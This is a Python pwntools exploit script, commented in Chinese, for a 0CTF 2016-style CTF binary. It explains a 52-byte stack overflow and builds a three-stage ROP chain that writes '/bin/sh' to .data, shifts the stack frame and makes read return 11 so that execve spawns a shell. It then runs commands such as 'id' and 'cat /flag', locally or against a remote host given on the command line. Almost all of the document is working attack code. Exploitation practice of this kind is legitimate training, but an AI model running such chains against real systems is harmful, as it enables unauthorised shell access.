#!/usr/bin/env python3
"""0CTF 2016 'welcome' 类型（纯 int 0x80 手写汇编）的自动利用。

二进制特征：
  724 字节、stripped、i386、静态、无 libc
  _start -> alarm(10) -> write("Welcome to 0CTF 2016!") -> vuln() -> exit(0)
  vuln: read(0, esp+0x10, 0x34) 后把 7 个寄存器全写成 0xdeadbeaf 再 ret

为什么普通 ret2syscall 打不进去：
  1. 只有 read/write/exit/alarm 四个 syscall 包装，没有 eax=11 的现成代码
  2. 溢出窗口只有 0x34=52 字节，返回地址在 offset 0x20，
     之后只剩 4 个 dword；而「read 返回 11 设置 eax」会让栈帧整体右移 4 字节，
     导致 execve 的第三个参数（envp）刚好落在窗口外一个 dword
  3. .data 与栈都不可执行（PT_LOAD RW，GNU_STACK RW），shellcode 无路

解法（三段）：
  A. read(0, .data, 0x34) 写入 "/bin/sh\\0" + 0 填充，回 vuln 继续
  B. 把 0 种在 anchor+4（下一段窗口外一格），再 ret 到 _start 让整个帧下移 0x10
     这样下一段里 execve 的 envp 槽位读到的正是这个 0
  C. read(0, .data, argv_ptr) 只发 11 字节 -> read 返回 11 -> eax=11
     紧接着进 0x804813a（mov ebx,[esp+4]; mov ecx,[esp+8]; mov edx,[esp+0xc]; int 0x80）
     -> execve("/bin/sh", {NULL}, NULL)
"""
from __future__ import annotations

import sys
import time

from pwn import context, process, remote, p32

# ---- 代码地址（非 PIE，固定）
READ = 0x804811D     # mov eax,3; ebx/ecx/edx <- [esp+4..0xc]; int 0x80; test; js; ret
INT80_LOAD = 0x804813A   # mov ebx,[esp+4]; mov ecx,[esp+8]; mov edx,[esp+0xc]; int 0x80
VULN = 0x804815A     # sub esp,0x30; read(0, esp+0x10, 0x34); ...; add esp,0x30; ret
START = 0x80480D8    # _start
DATA = 0x80491BC     # .data（"Welcome to 0CTF 2016!\n"）
ARGV_PTR = DATA + 8  # 该处内容会是 0，作为 argv = {NULL}

RET_OFF = 32         # 缓冲区到返回地址


def stage(target: int, ra: int, a1: int = 0, a2: int = 0, a3: int = 0) -> bytes:
    return b"A" * RET_OFF + p32(target) + p32(ra) + p32(a1) + p32(a2) + p32(a3)


def exploit(tube_factory, cmd_after=None, verbose=True):
    p = tube_factory()
    p.recvrepeat(0.3)

    # --- A: .data <- "/bin/sh\0" + 0，然后回 vuln
    p.send(stage(READ, VULN, 0, DATA, 0x34))
    time.sleep(0.2)
    p.send(b"/bin/sh\x00".ljust(0x34, b"\x00"))
    time.sleep(0.2)

    # --- B: 种 0 到 anchor+4，再 ret 到 _start（帧整体下移 0x10）
    p.send(b"A" * RET_OFF + p32(START) + p32(0) + b"A" * 12)
    time.sleep(0.25)

    # --- C: read 返回 11 -> eax=11 -> execve
    p.send(stage(READ, INT80_LOAD, 0, DATA, ARGV_PTR))
    time.sleep(0.2)
    p.send(b"/bin/sh\x00\x00\x00\x00")   # 11 字节，read 返回 11
    time.sleep(0.35)

    out = p.recvrepeat(0.6)
    ok = b"PWNED_42" in out
    # 本地 process 才看退出码；remote 没有 poll()
    alive = True
    if hasattr(p, "poll"):
        alive = p.poll() is None
    if not ok and alive:
        try:
            p.sendline(b"echo PWNED_$((6*7))")
            p.sendline(b"id")
            out += p.recvrepeat(0.9)
        except Exception:
            pass
        ok = b"PWNED_42" in out

    if verbose:
        print("[*] shell:", ok)
        print(repr(out[-300:]))

    if ok and cmd_after:
        for c in cmd_after:
            try:
                p.sendline(c.encode())
                print(f"$ {c}")
                print(p.recvrepeat(0.9).decode("latin-1", "replace").rstrip())
            except Exception as exc:
                print("err", exc)
    return p, ok


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        host, port = sys.argv[2], int(sys.argv[3])
        use_ssl = "--ssl" in sys.argv
        cmds = [a for a in sys.argv[4:] if a != "--ssl"]
        exploit(lambda: remote(host, port, ssl=use_ssl, sni=host if use_ssl else None, timeout=8),
                cmd_after=cmds or ["id", "ls -la /", "cat /flag"])
    else:
        BIN = sys.argv[1] if len(sys.argv) > 1 else \
            "/work/chellenges/7a4abf36c2cebe58ae6c7bff94737a8649589031480027275e3db85d636c9428"
        exploit(lambda: process(BIN), cmd_after=["id"])
